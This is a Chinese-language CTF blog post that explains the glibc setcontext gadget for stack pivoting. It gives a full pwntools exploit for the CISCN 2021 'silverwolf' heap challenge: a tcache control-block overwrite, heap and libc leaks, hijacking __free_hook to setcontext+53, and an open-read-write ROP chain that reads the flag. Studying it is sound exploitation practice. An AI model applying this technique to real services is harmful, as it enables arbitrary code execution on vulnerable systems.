+++
date = '2025-06-11T19:52:25+08:00'
draft = false
title = 'Setcontext'

+++

## 前置知识

setcontext函数是libc中一个独特的函数，它的功能是传入一个 SigreturnFrame 结构指针，然后根据SigreturnFrame 的内容设置各种寄存器。因此从setcontext+53（不同 libc 偏移可能不同）的位置开始有如下 gadget，即根据 rdi 也就是第一个参数指向的 SigreturnFrame 结构设置寄存器。

```c
pwndbg> info address setcontext
Symbol "setcontext" is at 0x7fab8d034c80 in a file compiled without debugging.
pwndbg> u 0x7fab8d034c80 20
 ► 0x7fab8d034c80 <setcontext>        push   rdi
   0x7fab8d034c81 <setcontext+1>      lea    rsi, [rdi + 0x128]
   0x7fab8d034c88 <setcontext+8>      xor    edx, edx               EDX => 0
   0x7fab8d034c8a <setcontext+10>     mov    edi, 2                 EDI => 2
   0x7fab8d034c8f <setcontext+15>     mov    r10d, 8                R10D => 8
   0x7fab8d034c95 <setcontext+21>     mov    eax, 0xe               EAX => 0xe
   0x7fab8d034c9a <setcontext+26>     syscall
   0x7fab8d034c9c <setcontext+28>     pop    rdi
   0x7fab8d034c9d <setcontext+29>     cmp    rax, -0xfff
   0x7fab8d034ca3 <setcontext+35>     jae    setcontext+128              <setcontext+128>

   0x7fab8d034ca5 <setcontext+37>     mov    rcx, qword ptr [rdi + 0xe0]
   0x7fab8d034cac <setcontext+44>     fldenv [rcx]
   0x7fab8d034cae <setcontext+46>     ldmxcsr dword ptr [rdi + 0x1c0]
   0x7fab8d034cb5 <setcontext+53>     mov    rsp, qword ptr [rdi + 0xa0]
   0x7fab8d034cbc <setcontext+60>     mov    rbx, qword ptr [rdi + 0x80]
   0x7fab8d034cc3 <setcontext+67>     mov    rbp, qword ptr [rdi + 0x78]
   0x7fab8d034cc7 <setcontext+71>     mov    r12, qword ptr [rdi + 0x48]
   0x7fab8d034ccb <setcontext+75>     mov    r13, qword ptr [rdi + 0x50]
   0x7fab8d034ccf <setcontext+79>     mov    r14, qword ptr [rdi + 0x58]
   0x7fab8d034cd3 <setcontext+83>     mov    r15, qword ptr [rdi + 0x60]
   0x7fab8d034cd7 <setcontext+87>     mov    rcx, qword ptr [rdi + 0xa8]
   0x7fab8d034cde <setcontext+94>     push   rcx
   0x7fab8d034cdf <setcontext+95>     mov    rsi, qword ptr [rdi + 0x70]
   0x7fab8d034ce3 <setcontext+99>     mov    rdx, qword ptr [rdi + 0x88]
   0x7fab8d034cea <setcontext+106>    mov    rcx, qword ptr [rdi + 0x98]
   0x7fab8d034cf1 <setcontext+113>    mov    r8, qword ptr [rdi + 0x28]
   0x7fab8d034cf5 <setcontext+117>    mov    r9, qword ptr [rdi + 0x30]
   0x7fab8d034cf9 <setcontext+121>    mov    rdi, qword ptr [rdi + 0x68]
   0x7fab8d034cfd <setcontext+125>    xor    eax, eax                            EAX => 0
   0x7fab8d034cff <setcontext+127>    ret
   0x7fab8d034d00 <setcontext+128>    mov    rcx, qword ptr [rip + 0x36b161]     RCX, [0x7fab8d39fe68] => 0xffffffffffffff80
   0x7fab8d034d07 <setcontext+135>    neg    eax
   0x7fab8d034d09 <setcontext+137>    mov    dword ptr fs:[rcx], eax
   0x7fab8d034d0c <setcontext+140>    or     rax, 0xffffffffffffffff
   0x7fab8d034d10 <setcontext+144>    ret
```

从这里我们可以大概明白一些数据这里我们主要需要控制的是一个rdi的数据并且rsp是rdi+0xa0的位置在低版本也就是2.27左右的版本就可以使用我们提前构造好的数据进行一个攻击，而我们这个时候的rdi就是可以使用删除一个堆块来实现，正好这个堆块的地址就会编程rdi指针因此我们就可以构造rsp，同时rsp这个指针正好可以控制栈迁移的位置

这里我们直接使用溢出国赛的题目的所谓练习

## [CISCN 2021 初赛]silverwolf

这个赛题正好可以用2.27来打，这里主要使用的攻击手法就是使用tcache的控制块来构造我们的rop和需要的一些控制块，因此我们的exp也是比较简单了

```py
from pwn import *
context.arch = 'amd64'
context.log_level = 'debug'
# s = remote("node4.anna.nssctf.cn",28501)
s = process('/home/fofa/setcontext/silverwolf')
libc = ELF('/home/fofa/setcontext/libc-2.27.so')

def add(size):
    s.sendlineafter(b'Your choice: ', b'1')
    s.sendlineafter(b'Index: ', b'0')
    s.sendlineafter(b'Size: ', str(size))

def edit(content):
    s.sendlineafter(b'Your choice: ', b'2')
    s.sendlineafter(b'Index: ', b'0')
    s.sendlineafter(b'Content: ', content)

def show():
    s.sendlineafter(b'Your choice: ', b'3')
    s.sendlineafter(b'Index: ', b'0')

def delete():
    s.sendlineafter(b'Your choice: ', b'4')
    s.sendlineafter(b'Index: ',b'0')

for i in range(7):
    add(0x78)
delete()
edit(b'a'*0x10)
delete()

show()
s.recvuntil(b'Content: ')
heap_base = u64(s.recv(6).ljust(8,b'\x00')) & 0xfffffffffffff000
success('heap_base=>' + hex(heap_base))

add(0x78)
edit(p64(heap_base + 0x10))
add(0x78)
add(0x78)
edit(b'\x00'*0x23 + b'\x07')
delete()

show()
s.recvuntil(b'Content: ')
libc_base = u64(s.recv(6)[-6:].ljust(8,b'\x00')) - 96 - 0x10 - libc.sym['__malloc_hook']
success('libc_base=>' + hex(libc_base))

pop_rdi_ret = libc_base + 0x00000000000215bf
pop_rsi_r15_ret = libc_base + 0x00000000000215bd
pop_rdx_ret = libc_base + 0x0000000000001b96
pop_rax_ret = libc_base + 0x0000000000043ae8
syscall_ret = libc_base + libc.sym['read'] + 0xf
ret = libc_base + 0x00000000000008aa

__free_hook = libc_base + libc.sym['__free_hook']
setcontext_53 = libc_base + libc.sym['setcontext'] + 53
write_addr = libc_base + libc.sym['write']

flag_addr = heap_base + 0x1000
stack_addr_1 = heap_base + 0x2000
stack_addr_2 = heap_base + 0x20a0
orw_addr_1 = heap_base + 0x3000
orw_addr_2 = heap_base + 0x3060

orw = p64(pop_rdi_ret) + p64(flag_addr)
orw+= p64(pop_rsi_r15_ret) + p64(0) + p64(0)
orw+= p64(pop_rax_ret) + p64(2)
orw+= p64(syscall_ret)
orw+= p64(pop_rdi_ret) + p64(3)
orw+= p64(pop_rsi_r15_ret) + p64(heap_base + 0x4000) + p64(0)
orw+= p64(pop_rdx_ret) + p64(0x100)
orw+= p64(pop_rax_ret) + p64(0)
orw+= p64(syscall_ret)
orw+= p64(pop_rdi_ret) + p64(1)
orw+= p64(pop_rsi_r15_ret) + p64(heap_base + 0x4000) + p64(0)
orw+= p64(pop_rdx_ret) + p64(0x100)
orw+= p64(write_addr) #0xd0

payload = b'\x02'*0x40
payload+= p64(__free_hook)   #0x20
payload+= p64(flag_addr)     #0x30
payload+= p64(0)             #0x40
payload+= p64(stack_addr_1)  #0x50
payload+= p64(stack_addr_2)  #0x60
payload+= p64(orw_addr_1)    #0x70
payload+= p64(orw_addr_2)    #0x80

edit(payload)
# gdb.attach(s)
add(0x10)
edit(p64(setcontext_53))

add(0x20)
edit(b'./flag')

add(0x50)
edit(p64(orw_addr_1) + p64(ret))

add(0x60)
edit(orw[:0x60])

add(0x70)
edit(orw[0x60:])

add(0x40)
gdb.attach(s)

delete()

s.interactive()
```

